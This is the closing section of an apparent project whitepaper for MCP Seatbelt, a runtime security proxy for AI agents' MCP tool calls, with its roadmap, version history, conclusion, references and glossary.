- [ ] **Persistent audit trail with SQLite** — Optional SQLite backend for audit logs enabling indexed queries, aggregation, and retention policies
- [ ] **Plugin system for custom risk rules** — Community-contributed risk rules and detector modules
- [ ] **LDAP/OIDC integration** — Enterprise identity provider integration for RBAC agent identity resolution
- [ ] **gRPC transport support** — For environments using gRPC-based MCP servers
- [ ] **TEE / Secure Enclave Execution** — Run Seatbelt inside a Trusted Execution Environment (AWS Nitro Enclaves, Intel SGX) for environments requiring hardware-backed isolation of the security proxy itself
- [ ] **Formal verification of policy engine** — Mathematical proof of correctness for the policy evaluation algorithm, ensuring no bypasses exist in the evaluation logic itself
- [ ] **FIPS 140-2 compliant cryptography** — FIPS-validated cryptographic module for the signed audit trail in FedRAMP and DoD environments
- [ ] **SOC 2 Type II certification** — Independent audit of Seatbelt's security controls over a sustained observation period
- [ ] **FedRAMP authorization** — Authorization for use in US federal government cloud environments
- [ ] **MISP/OpenCTI integration** — Additional threat intelligence backends for organizations with private TI platforms
- [ ] **Distributed attack chain correlation** — Cross-instance attack chain tracking via shared Redis or database for multi-instance deployments
- [ ] **Automated policy generation from observatory scoring** — Full auto-pilot mode where observatory scores directly drive policy without manual import step
- [ ] **Decentralized audit log replication** — For multi-instance deployments with eventual consistency guarantees

### 9.3 Version History

| Version | Date | Highlights |
|---------|------|------------|
| 0.1.0 | Initial | Basic proxy, policy engine, 7 risk rules, 3 client detectors |
| 0.2.0 | July 10, 2026 | Per-call timeouts, 10 parallel features |
| 0.3.0 | July 16, 2026 | Docker, per-call timeouts, 348 tests |
| 0.4.0 | July 17, 2026 | 8 cybersecurity capabilities, 485 tests |

---

## 10. Conclusion

The Model Context Protocol has enabled a step change in what AI coding agents can do — but it has done so without a corresponding step change in security. Agents that can read files, execute shell commands, query databases, and make network requests are operating with effectively unrestricted access, because the protocol itself provides no enforcement layer.

Static scanners are necessary but insufficient. Network firewalls are in the wrong layer. API gateways lack MCP semantics. What the ecosystem needs — and what MCP Seatbelt provides — is a protocol-layer security proxy that understands JSON-RPC, inspects tool arguments, enforces configurable policies, and applies defense-in-depth across every call.

Seatbelt's 12-stage pipeline is the most comprehensive runtime security architecture available for MCP. Its defense-in-depth approach — spanning pre-execution gates, real-time intelligence, response protection, governance, and operational reliability — reflects the reality that no single check catches every threat. A schema-valid, policy-allowed, RBAC-authorized, threat-intel-cleared call that passes individual evaluation might still be part of a multi-step exfiltration chain — and the attack chain state machine catches that. A clean tool response might still contain secrets leaked by the upstream server — and the DLP scanner catches that. An attacker who extracts response data might attempt to use what looks like a credential — and the honeytoken detector catches that.

Combined with mcp-observatory's pre-install scanning, Seatbelt is part of the only end-to-end open-source platform for MCP security: scan before you trust, enforce at runtime, and audit after the fact. For security engineers evaluating MCP runtime protection, for CTOs deploying AI agents in production, and for compliance teams documenting controls for audit — Seatbelt fills the missing layer.

The vision is ambitious. Much of it is built and tested today. Some of it — TEE execution, formal verification, FIPS compliance, FedRAMP authorization — lies ahead. But the architecture is designed from the ground up to support that full vision: a security proxy that operates at the protocol layer, with full semantic understanding of what an agent is asking to do, and the authority to say no — before the call ever reaches a system it could harm.

---

## Appendix A: References

### Standards & Frameworks
- **OWASP LLM Top 10 (v2.0, 2025):** https://owasp.org/www-project-top-10-for-large-language-model-applications/
- **SOC 2 Trust Services Criteria (TSC 2017):** https://www.aicpa.org/resources/audit-attest/trust-services-criteria
- **HIPAA Security Rule (45 CFR § 164.312):** https://www.hhs.gov/hipaa/for-professionals/security/
- **GDPR Article 32 (Security of Processing):** https://gdpr-info.eu/art-32-gdpr/
- **ISO/IEC 27001:2022:** https://www.iso.org/standard/27001
- **PCI-DSS v4.0.1:** https://www.pcisecuritystandards.org/
- **NIST Cybersecurity Framework (CSF 2.0):** https://www.nist.gov/cyberframework
- **STRIDE Threat Model:** Microsoft, "The STRIDE Threat Model" (2005)

### Dependencies & Tools
- **AJV (JSON Schema Validator):** https://github.com/ajv-validator/ajv
- **Casbin (Authorization Library):** https://github.com/casbin/node-casbin
- **XState (State Machine):** https://github.com/statelyai/xstate
- **ThreatFox (Threat Intelligence):** https://threatfox.abuse.ch/
- **Commander.js (CLI Framework):** https://github.com/tj/commander.js

### Related Projects
- **MCP Observatory (Pre-install Scanning):** https://github.com/KryptosAI/mcp-observatory
- **MCP Specification:** https://spec.modelcontextprotocol.io/
- **awesome-mcp-servers (90k★ curated list):** https://github.com/punkpeye/awesome-mcp-servers

## Appendix B: Glossary

| Term | Definition |
|---|---|
| **MCP** | Model Context Protocol — an open standard (by Anthropic) for AI agents to communicate with external tools |
| **MCP Server** | A program that exposes tools, resources, and prompts to AI agents via the MCP protocol |
| **JSON-RPC 2.0** | The transport protocol used by MCP for request/response communication |
| **Tool Call** | An AI agent requesting an MCP server to execute a specific function (e.g., read_file, run_command) |
| **Policy Engine** | The component that evaluates tool calls against user-defined rules and returns allow/deny/warn/redact |
| **DLP** | Data Loss Prevention — scanning content for sensitive patterns (credentials, keys, PII) |
| **RBAC** | Role-Based Access Control — permission system based on agent identity and assigned roles |
| **IOC** | Indicator of Compromise — IP addresses, domains, or hashes associated with malicious activity |
| **Honeytoken** | A decoy credential or data planted to detect unauthorized access or reconnaissance |
| **Attack Chain** | A sequence of tool calls that, individually benign, combine to form a malicious pattern |
| **Forensic Capture** | Recording full request/response pairs for post-incident analysis |
| **SARIF** | Static Analysis Results Interchange Format — standard format for code scanning results used by GitHub |
| **CASBIN** | An open-source authorization library supporting ACL, RBAC, and ABAC models |
| **XSTATE** | A TypeScript state machine library used for attack chain pattern detection |
| **THREATFOX** | A free threat intelligence platform by abuse.ch providing IOC reputation data |
| **AJV** | Another JSON Schema Validator — the fastest JSON Schema validator for TypeScript/JavaScript |

---

**Repository:** [github.com/KryptosAI/mcp-seatbelt](https://github.com/KryptosAI/mcp-seatbelt)
**Package:** `@kryptosai/mcp-seatbelt` (npm)
**Container:** `ghcr.io/kryptosai/mcp-seatbelt` (Docker)
**License:** MIT
**Contact:** william@banksey.com
**Website:** [kryptosai.github.io/mcp-seatbelt](https://kryptosai.github.io/mcp-seatbelt)
